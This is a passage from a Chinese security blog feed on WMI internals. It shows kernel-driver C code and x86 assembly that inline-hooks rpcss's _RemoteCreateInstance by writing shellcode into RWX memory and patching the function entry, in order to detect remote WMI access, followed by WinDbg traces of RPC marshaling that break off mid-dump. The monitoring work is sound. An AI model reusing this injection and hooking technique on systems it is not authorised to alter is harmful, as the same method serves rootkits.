class="number">0x01c</span> <span class="string">EntryPoint       :</span> <span class="number">0x00d96170</span> Void</div><div class="line">   +<span class="number">0x020</span> <span class="string">SizeOfImage      :</span> <span class="number">0x11000</span></div><div class="line">   +<span class="number">0x024</span> <span class="string">FullDllName      :</span> _UNICODE_STRING <span class="string">"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"</span></div><div class="line">   +<span class="number">0x02c</span> <span class="string">BaseDllName      :</span> _UNICODE_STRING <span class="string">"vmtoolsd.exe"</span></div><div class="line">   ....</div><div class="line"><span class="number">1</span>: kd&gt; dt _LDR_DATA_TABLE_ENTRY <span class="number">0x3e1a80</span></div><div class="line">ntdll!_LDR_DATA_TABLE_ENTRY</div><div class="line">   +<span class="number">0x000</span> <span class="string">InLoadOrderLinks :</span> _LIST_ENTRY [ <span class="number">0x3e1d78</span> - <span class="number">0x3e1a00</span> ]</div><div class="line">   +<span class="number">0x008</span> <span class="string">InMemoryOrderLinks :</span> _LIST_ENTRY [ <span class="number">0x3e1d80</span> - <span class="number">0x3e1a08</span> ]</div><div class="line">   +<span class="number">0x010</span> <span class="string">InInitializationOrderLinks :</span> _LIST_ENTRY [ <span class="number">0x3e1e70</span> - <span class="number">0x7743789c</span> ]</div><div class="line">   +<span class="number">0x018</span> <span class="string">DllBase          :</span> <span class="number">0x77360000</span> Void</div><div class="line">   +<span class="number">0x01c</span> <span class="string">EntryPoint       :</span> (<span class="literal">null</span>) </div><div class="line">   +<span class="number">0x020</span> <span class="string">SizeOfImage      :</span> <span class="number">0x13c000</span></div><div class="line">   +<span class="number">0x024</span> <span class="string">FullDllName      :</span> _UNICODE_STRING <span class="string">"C:\Windows\SYSTEM32\ntdll.dll"</span></div><div class="line">   +<span class="number">0x02c</span> <span class="string">BaseDllName      :</span> _UNICODE_STRING <span class="string">"ntdll.dll"</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着就是定位<code>_RemoteCreateInsance</code>函数，<code>_RemoteCreateInsance</code>函数并不是导出函数，所以只能通过特征码爆破搜索<code>_RemoteCreateInsance</code>函数地址。我看过相关暴力搜索函数的方法，很多都是通过搜索函数调用的方式进行定位，但是我并没有发现<code>_RemoteCreateInsance</code>函数存在直接调用。于是通过IDA看了<code>_RemoteCreateInsance</code>函数的反汇编代码，可以看到两个硬编码的返回值。经过我的测试，只有<code>_RemoteCreateInsance</code>函数才能同时搜索到这两个硬编码。于是只需要搜索这两个编码便可以定位<code>_RemoteCreateInsance</code>函数。<br>    <img src="http://hacky.wang/blog/20211107/3K5uvN4S7VhE.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;获取了<code>_RemoteCreateInsance</code>函数函数地址之后，便可以进行Hook了，此处，本文选择InlineHook，关于InlineHook的具体原理不做赘述，如果有需要了解的可以查看<a href="https://bbs.pediy.com/thread-251412.htm" target="_blank" rel="external">一篇文章带你理解HOOK技术</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里参考我之前写的InlineHook的基本步骤(<a href="https://github.com/findream/Windows_Safe_Development/blob/master/Hook/IAT_HOOK/InlineHookMessageBox(%E8%BF%9B%E9%98%B6)/InlineHookMessageBox(%E8%BF%9B%E9%98%B6).cpp" target="_blank" rel="external">https://github.com/findream/Windows_Safe_Development/blob/master/Hook/IAT_HOOK/InlineHookMessageBox(%E8%BF%9B%E9%98%B6)/InlineHookMessageBox(%E8%BF%9B%E9%98%B6).cpp</a>)</p><ul><li>第一步:填充HookData结构体，HookData保存着各种关于Hook的信息</li><li>第二步:检查是否被Hook</li><li>第三步:保存函数原始数据</li><li>第四步:填充TrampolineFun函数</li><li>第五步:修改原始函数入口点进行Hook</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但是本文做些许改动，首先InlineHook应该要构建两个函数，一个是DetourFun，另外一个是TrampolineFun。DetourFun是劫持后的函数，用于替换被劫持的函数，而TrampolineFun为了持久化Hook，以便跳回原始的目标函数。本文首先会删除多余的TrampolineFun函数，具体原因，我会在第四章中描述。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;那么如何实现TrampolineFun函数的功能呢，我将TrampolineFun函数功能写在DetourFun函数中。因为TrampolineFun函数本身就是就是构造目标函数的前5个字节，然后跳转到目标函数第六个字节处。这一切本文会放在构造DetourFun去描述。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二个改动是将DetourFun的shellcode写入目标进程，至于原因，仍然放在番外一节中讲述。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line">HRESULT InstallHook(PVOID pFunctionAddr_RemoteCreateInstance, PEPROCESS pEprocessOfRpcss)</div><div class="line">&#123;</div><div class="line"></div><div class="line"><span class="comment">//初始化HookData</span></div><div class="line">HookData.TargetFunctionAddr = pFunctionAddr_RemoteCreateInstance;</div><div class="line">HookData.JmpBackAddr = (ULONG)pFunctionAddr_RemoteCreateInstance + <span class="number">5</span>;</div><div class="line">HookData.NewFunctionByte = ExAllocatePool(NonPagedPool, <span class="number">5</span>);</div><div class="line">HookData.OldFunctionByte = ExAllocatePool(NonPagedPool, <span class="number">5</span>);</div><div class="line">RtlZeroMemory(HookData.NewFunctionByte, <span class="number">5</span>);</div><div class="line">RtlZeroMemory(HookData.OldFunctionByte, <span class="number">5</span>);</div><div class="line"></div><div class="line"><span class="comment">//在进城中开辟空间存储shellcode</span></div><div class="line">HANDLE hProcess = NULL;</div><div class="line">NTSTATUS ntStatus = <span class="number">0</span>;</div><div class="line">ntStatus = ObOpenObjectByPointer((PVOID)pEprocessOfRpcss,</div><div class="line">OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE,</div><div class="line">NULL,</div><div class="line">GENERIC_ALL,</div><div class="line">*PsProcessType,</div><div class="line">KernelMode,</div><div class="line">&amp;hProcess</div><div class="line">);</div><div class="line">if (!NT_SUCCESS(ntStatus))</div><div class="line">&#123;</div><div class="line">DbgPrint(<span class="string">"[!]ObOpenObjectByPointer hProcess Failed"</span>, ntStatus);</div><div class="line">return <span class="number">-1</span>;</div><div class="line">&#125;</div><div class="line">PVOID fnDetourRemoteCreateInstanceShellcode_Addr = NULL;</div><div class="line">ULONG uSizeOffnDetourRemoteCreateInstanceShellcode = <span class="number">0x200</span>;</div><div class="line">ntStatus = ZwAllocateVirtualMemory(hProcess, &amp;fnDetourRemoteCreateInstanceShellcode_Addr, <span class="number">0</span>, &amp;uSizeOffnDetourRemoteCreateInstanceShellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</div><div class="line">if (!NT_SUCCESS(ntStatus))</div><div class="line">&#123;</div><div class="line">DbgPrint(<span class="string">"[!]Virtual memory for fnDetourRemoteCreateInstance Failed"</span>, ntStatus);</div><div class="line">return <span class="number">-1</span>;</div><div class="line">&#125;</div><div class="line">HookData.pfnDetourFun = fnDetourRemoteCreateInstanceShellcode_Addr;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">//检查是否被Hook</span></div><div class="line">UCHAR OldFunctionByte[<span class="number">5</span>] = &#123; <span class="number">0x8B</span>, <span class="number">0xFF</span>, <span class="number">0x55</span>, <span class="number">0x8B</span>, <span class="number">0xEC</span> &#125;;</div><div class="line">if (RtlCompareMemory((PVOID)HookData.TargetFunctionAddr, (PVOID)OldFunctionByte, <span class="number">5</span>) != <span class="number">5</span>)</div><div class="line">&#123;</div><div class="line">DbgPrint(<span class="string">"[!]detected target function hooked"</span>);</div><div class="line">return <span class="number">-1</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">// 保存Target 函数 Bytes</span></div><div class="line">RtlCopyMemory(HookData.OldFunctionByte, pFunctionAddr_RemoteCreateInstance, <span class="number">5</span>);</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">//将DetourRemoteCreateInstance函数Shellcode写入内存</span></div><div class="line">RtlZeroMemory(fnDetourRemoteCreateInstanceShellcode_Addr, uSizeOffnDetourRemoteCreateInstanceShellcode);</div><div class="line">RtlCopyMemory(fnDetourRemoteCreateInstanceShellcode_Addr, _DetourRemoteCreateInstance, uSizeOffnDetourRemoteCreateInstanceShellcode);</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">//IRQL</span></div><div class="line">WPOFF();</div><div class="line">KIRQL oldIrql;</div><div class="line">oldIrql = KeRaiseIrqlToDpcLevel();</div><div class="line"></div><div class="line"><span class="comment">//修改入口点数据</span></div><div class="line">HookData.NewFunctionByte[<span class="number">0</span>] = <span class="number">0xE9</span>;</div><div class="line">*(ULONG*)(HookData.NewFunctionByte + <span class="number">1</span>) = (ULONG)fnDetourRemoteCreateInstanceShellcode_Addr - HookData.TargetFunctionAddr - <span class="number">5</span>;</div><div class="line">RtlCopyMemory(HookData.TargetFunctionAddr, HookData.NewFunctionByte, <span class="number">5</span>);</div><div class="line"></div><div class="line">KeLowerIrql(oldIrql);</div><div class="line">WPON();</div><div class="line">return STATUS_SUCCESS;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如何构造DetourFun函数，DetourFun函数主要有两个目的，第一个就是解析<code>_RemoteCreateInstance</code>函数的pActProperties参数中的IP和CLSID，另外一个是和驱动程序进行通信，反馈结果。本文采用常见的驱动通信的方式，首先仍然通过PEB获取Kernel32的模块地址，然后通过导出表获取所需要的函数地址，比如CreateFile，WriteFile，CloseHandle等和驱动通信相关的函数地址，然后解析pActProperties参数。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最最重要的是如何构造TrampolineFun所需要的功能。但是在描述TrampolineFun功能之前，需要了解一下调用函数的方式，在调用x86的stdcall函数时，会先将参数从右到左依次传入堆栈，然后将返回地址压入堆栈，然后构造TrampolineFun函数，这样就可以保证堆栈的平衡。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span> - <span class="number">24h</span>]</div><div class="line"><span class="keyword">add</span>     <span class="built_in">eax</span>, <span class="number">5</span></div><div class="line"><span class="keyword">mov</span>[<span class="built_in">ebp</span> - <span class="number">24h</span>], <span class="built_in">eax</span>   //RemoteCreateInstance函数地址</div><div class="line">//压入参数</div><div class="line"><span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span> + <span class="number">1Ch</span>]</div><div class="line"><span class="keyword">push</span>    <span class="built_in">eax</span></div><div class="line"><span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span> + <span class="number">18h</span>]</div><div class="line"><span class="keyword">push</span>    <span class="built_in">ecx</span></div><div class="line"><span class="keyword">mov</span>     <span class="built_in">edx</span>, [<span class="built_in">ebp</span> + <span class="number">14h</span>]</div><div class="line"><span class="keyword">push</span>    <span class="built_in">edx</span></div><div class="line"><span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span> + <span class="number">10h</span>]</div><div class="line"><span class="keyword">push</span>    <span class="built_in">eax</span></div><div class="line"><span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span> + <span class="number">0Ch</span>]</div><div class="line"><span class="keyword">push</span>    <span class="built_in">ecx</span></div><div class="line"><span class="keyword">mov</span>     <span class="built_in">edx</span>, [<span class="built_in">ebp</span> + <span class="number">8</span>]</div><div class="line"><span class="keyword">push</span>    <span class="built_in">edx</span></div><div class="line"><span class="keyword">mov</span>     <span class="built_in">edx</span>, [<span class="built_in">ebp</span> - <span class="number">24h</span>]</div><div class="line">//压入返回地址</div><div class="line"><span class="keyword">call</span> NEXT</div><div class="line">NEXT :</div><div class="line"><span class="keyword">pop</span> <span class="built_in">eax</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">eax</span>,<span class="number">12</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">eax</span></div><div class="line">//压入<span class="built_in">ebp</span></div><div class="line"><span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="built_in">edi</span></div><div class="line"><span class="keyword">push</span>    <span class="built_in">ebp</span></div><div class="line"><span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span></div><div class="line"><span class="keyword">jmp</span>     <span class="built_in">edx</span></div><div class="line"><span class="keyword">pop</span>     <span class="built_in">edi</span></div><div class="line"><span class="keyword">pop</span>     <span class="built_in">esi</span></div><div class="line"><span class="keyword">pop</span>     <span class="built_in">ebx</span></div><div class="line"><span class="keyword">mov</span>     <span class="built_in">esp</span>, <span class="built_in">ebp</span></div><div class="line"><span class="keyword">pop</span>     <span class="built_in">ebp</span></div><div class="line"><span class="keyword">retn</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TrampolineFun函数功能其实就是两部分，一是填充目标函数前5个字节(此处的InlineHook是这样的，亦可填充其他字节)。二是跳转到目标函数后面的地址，保证Hook的持久化。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="built_in">edi</span></div><div class="line"><span class="keyword">push</span>    <span class="built_in">ebp</span></div><div class="line"><span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span></div><div class="line"><span class="keyword">jmp</span>     <span class="built_in">edx</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最终的结果是这样的。具体源码可以在<a href="https://github.com/findream/SecStudy/blob/main/ATT-CK/Windows%20Management%20Instrumentation/WMI_Monitor/MyDriver1/Hook.c" target="_blank" rel="external">https://github.com/findream/SecStudy/blob/main/ATT-CK/Windows%20Management%20Instrumentation/WMI_Monitor/MyDriver1/Hook.c</a>可以看到。也可以观看我在B站上上传的<a href="https://www.bilibili.com/video/BV1q44y1x7mT/" target="_blank" rel="external">WMI远程访问检测</a>的视频。<br>   <img src="http://hacky.wang/blog/20211107/c3MwXvD9bw4U.png?imageslim" alt="mark"></p><h2 id="0x04-番外"><a href="#0x04-番外" class="headerlink" title="0x04 番外"></a>0x04 番外</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;了解操作系统的都知道，普通的应用程序都运行在R3，驱动程序都运行在R0。最开始，将DetourFun存储在驱动程序中，当Hook R3层<code>RemoteCreateInstance</code>函数后，此时EIP位于<code>RemoteCreateInstance</code>函数，当Jmp后，不可能跳转到位于驱动程序中的DetourFun函数。所以首先将shellcode写入R3内存。</p><h2 id="0x05-参考文献"><a href="#0x05-参考文献" class="headerlink" title="0x05 参考文献"></a>0x05 参考文献</h2><ul><li><a href="https://bbs.pediy.com/thread-248128.htm" target="_blank" rel="external">CVE-2015-2370之DCOM DCE/RPC协议原理详细分析</a></li><li><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31" target="_blank" rel="external">OBJREF结构</a></li><li><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/21781a97-cb45-4655-82b0-02c4a1584603" target="_blank" rel="external">MInterfacePointer结构</a></li><li><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c25391af-f59e-40da-885e-cc84076673e4" target="_blank" rel="external">Standards Assignments</a></li><li><a href="https://bbs.pediy.com/thread-251412.htm" target="_blank" rel="external">一篇文章带你理解HOOK技术</a></li><li><a href="https://www.bilibili.com/video/BV1q44y1x7mT/" target="_blank" rel="external">WMI远程访问检测</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;本文转载于跳跳糖安全社区，原文链接为&lt;a href=&quot;https://tttang.com/archive/1639/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://tttang.com/archive/1639/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="windows系统" scheme="https://findream.github.io/categories/windows%E7%B3%BB%E7%BB%9F/"/>
    
    
  </entry>
  
  <entry>
    <title>WMI调试与检测</title>
    <link href="https://findream.github.io/2021/11/06/WMI%E8%B0%83%E8%AF%95%E4%B8%8E%E6%A3%80%E6%B5%8B/"/>
    <id>https://findream.github.io/2021/11/06/WMI调试与检测/</id>
    <published>2021-11-06T04:02:11.000Z</published>
    <updated>2022-09-14T13:17:47.207Z</updated>
    
    <content type="html"><![CDATA[<ul><li>本文转载于跳跳糖安全社区，原文链接为<a href="https://tttang.com/archive/1640/" target="_blank" rel="external">https://tttang.com/archive/1640/</a></li></ul><a id="more"></a><h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这是WMI的第三篇文章，本文主要调式分析WMI消费者的工作原理，进而提出WMI的检测思路。本文首先介绍了本次分析所需要了解的WMI基本组件和底层协议(RPC),然后通过调式网上的RPC客户端和服务端的通信，了解RPC的原理，接着通过分析两个典型的WMI利用(查询数据，执行函数)，了解WMI的检测，由于WMI调试相关资料过少，没有进行自我订正，可能存在错误，或者重大错误，希望有了解的大佬积极斧正。</p><h1 id="0x1-WMI组件介绍"><a href="#0x1-WMI组件介绍" class="headerlink" title="0x1 WMI组件介绍"></a>0x1 WMI组件介绍</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这一节内容截取于软件调试补编。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WMI大多数文件都保存在%system32%\wbem文件夹下，其中下面文件是本次调试分析中使用到的<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">wbemcore<span class="selector-class">.dll</span>    WMI核心模块</div><div class="line">Wbemprox<span class="selector-class">.dll</span>    WBEM代理，供 WMI应用程序连接WMI服务，包含了IWbemLocator接口的实现(Clocator类)。</div><div class="line">Fastprox<span class="selector-class">.dll</span>    包含了用于进程间调用和RPC通信的类和函数,又称为Microsoft WBEMFast Call Context。</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CIM对象管理器(CIM Object Manager，简称CIMOM）是WMI的核心部件。它负责管理和维护系统中的类和对象，也是 WMI管理程序（消耗器）和 WMI提供器之间进行交互的桥梁。从进程的角度看，CIMOM是工作在WMI服务器进程中的一系列动态链接库，它们利用COM/DCOM 技术相互协作。对外也是以COM接口的形式公开它们的服务。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WBEMCORE.DLL中的CWbemInstance类是描述和管理CIM类实例的一个内部类。包括读取实例的类名(class name)、修改或读取实例的属性值、复制实例数据等。MSDN中公开的IWbemClassObject 接口定义了操作WMI类和实例的基本方法,通过该接口，WMI应用程序可以访问相应的WMI类或实例。可以认为CWbemClass类和CWbemInstance类为实现这一接口的方法而提供的支持类。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WMI应用程序利用DCOM技术来使用WMI服务进程内的WMI服务。DCOM是分布式组件模型的简称，是对COM技术的扩展，目的是使不同计算机上的COM对象可以相互通信。DCOM协议又被称为对象RPC (Object Remote Procedure Call)，是基于标准RPC协议而制定的。</p><h1 id="0x2-RPC调试原理"><a href="#0x2-RPC调试原理" class="headerlink" title="0x2 RPC调试原理"></a>0x2 RPC调试原理</h1><h2 id="0x2-1-客户端发送数据"><a href="#0x2-1-客户端发送数据" class="headerlink" title="0x2.1 客户端发送数据"></a>0x2.1 客户端发送数据</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RPC客户端使用<code>NdrClientCall2</code>函数发送和接收数据，<code>NdrClientCall2</code>函数是客户端入口的一个存根函数。<code>NdrClientCall2</code>函数是一个不定参数函数，从第三个参数开始，传入的是调用的服务端函数所需要的参数。<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dc esp</div><div class="line"><span class="number">0055</span>f9e4  <span class="number">003</span>d0d70 <span class="number">003</span>d0caa <span class="number">0055</span>fadc <span class="number">0055</span>fc20  p.=...=...U. .U.  </div><div class="line"><span class="number">0055</span>f9f4  <span class="number">0055</span>fc28 <span class="number">7</span>efde000 cccccccc cccccccc  (.U....~........</div><div class="line">...</div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dc <span class="number">0055</span>fadc</div><div class="line"><span class="number">0055</span>fadc  <span class="number">0055</span>fbd8 <span class="number">00000040</span> <span class="number">0055</span>fd7c <span class="number">0055</span>fc28  ..U.@...|.U.(.U.   &lt;---<span class="number">-0055</span>fbd8调用完成后填入返回值,<span class="number">40</span>作为传入的参数</div><div class="line"><span class="number">0055</span>faec  <span class="number">7</span>efde000 cccccccc cccccccc cccccccc  ...~............</div><div class="line">...</div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dc <span class="number">0055</span>fbd8                </div><div class="line"><span class="number">0055</span>fbd8  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</div><div class="line"><span class="number">0055</span>fbe8  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</div><div class="line"><span class="number">0055</span>fbf8  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</div><div class="line"><span class="number">0055</span>fc08  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</div><div class="line">....</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在MulNdrpInitializeContextFromProc+0x4B处，将参数堆栈保存在pStubMsg.pContext结构体中。<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _MIDL_STUB_MESSAGE <span class="number">0055</span>f60c</div><div class="line">Client!_MIDL_STUB_MESSAGE</div><div class="line">   +<span class="number">0x000</span> RpcMsg           : <span class="number">0x0055f5e0</span> _RPC_MESSAGE</div><div class="line">   ....</div><div class="line">   +<span class="number">0x0c4</span> pContext         : <span class="number">0x0055f70c</span> _NDR_PROC_CONTEXT</div><div class="line">   ....</div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dc <span class="number">0055</span>f70c +<span class="number">0x18</span></div><div class="line"><span class="number">0055</span>f724  <span class="number">0055</span>fadc <span class="number">00000232</span> <span class="number">00000000</span> <span class="number">003</span>d0cb4  ..U<span class="number">.2</span>.........=.</div><div class="line"><span class="number">0055</span>f734  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</div><div class="line">...</div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dc <span class="number">0055</span>fadc </div><div class="line"><span class="number">0055</span>fadc  <span class="number">0055</span>fbd8 <span class="number">00000040</span> <span class="number">0055</span>fd7c <span class="number">0055</span>fc28  ..U.@...|.U.(.U.</div><div class="line"><span class="number">0055</span>faec  <span class="number">7</span>efde000 cccccccc cccccccc cccccccc  ...~............</div><div class="line">...</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NdrpClientMarshal函数相当于格式化参数等所需要的数据，便于远程调用，在函数调用之前，可以看到RpcMsg-&gt;Buffer并不存在数据，但是在调用NdrpClientMarshal之后，已经将[In]参数传入RpcMsg-&gt;Buffer中(可能_RPC_MESSAGE结构的地址不一样是因为这是两次不同的调试)。<br><figure class="highlight lasso"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _RPC_MESSAGE <span class="number">0055</span>f5e0</div><div class="line">Client!_RPC_MESSAGE</div><div class="line">   +<span class="number">0x000</span> <span class="keyword">Handle</span>           : (<span class="built_in">null</span>) </div><div class="line">   +<span class="number">0x004</span> DataRepresentation : <span class="number">0x22c</span></div><div class="line">   +<span class="number">0x008</span> Buffer           : (<span class="built_in">null</span>) </div><div class="line">   <span class="params">...</span>.</div><div class="line"></div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt;  dt _RPC_MESSAGE <span class="number">0040</span>f3b4</div><div class="line">Client!_RPC_MESSAGE</div><div class="line">   +<span class="number">0x000</span> <span class="keyword">Handle</span>           : <span class="number">0x004dbb78</span> <span class="literal">Void</span></div><div class="line">   +<span class="number">0x004</span> DataRepresentation : <span class="number">0x22c</span></div><div class="line">   +<span class="number">0x008</span> Buffer           : <span class="number">0x004dc2d0</span> <span class="literal">Void</span></div><div class="line">   <span class="params">...</span>.</div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dc <span class="number">004</span>dc2d0</div><div class="line"><span class="number">004</span>dc2d0  <span class="number">00000040</span> <span class="number">00010000</span> <span class="number">551</span>d88b0 <span class="number">4283</span>b831  @<span class="params">...</span><span class="params">...</span><span class="params">...</span>.U1..B</div><div class="line"><span class="number">004</span>dc2e0  <span class="number">6527</span>cda1 <span class="number">289</span>fe459 <span class="number">00000001</span> <span class="number">8</span>a885d04  ..<span class="string">'eY..(.....]..</span></div><div class="line"><span class="string">004dc2f0  11c91ceb 0008e89f 6048102b 00000002  ........+.H`....</span></div><div class="line"><span class="string">004dc300  00010001 551d88b0 4283b831 6527cda1  .......U1..B..'</span>e</div><div class="line"><span class="number">004</span>dc310  <span class="number">289</span>fe459 <span class="number">00000001</span> <span class="number">6</span>cb71c2c <span class="number">45409812</span>  Y..(<span class="params">...</span>.,..l..@E</div><div class="line"><span class="number">004</span>dc320  <span class="number">00000003</span> <span class="number">00000000</span> <span class="number">00000001</span> baadf00d  <span class="params">...</span><span class="params">...</span><span class="params">...</span><span class="params">...</span><span class="params">...</span>.</div><div class="line"><span class="number">004</span>dc330  baadf00d baadf00d baadf00d baadf00d  <span class="params">...</span><span class="params">...</span><span class="params">...</span><span class="params">...</span><span class="params">...</span>.</div><div class="line"><span class="number">004</span>dc340  baadf00d baadf00d baadf00d baadf00d  <span class="params">...</span><span class="params">...</span><span class="params">...</span><span class="params">...</span><span 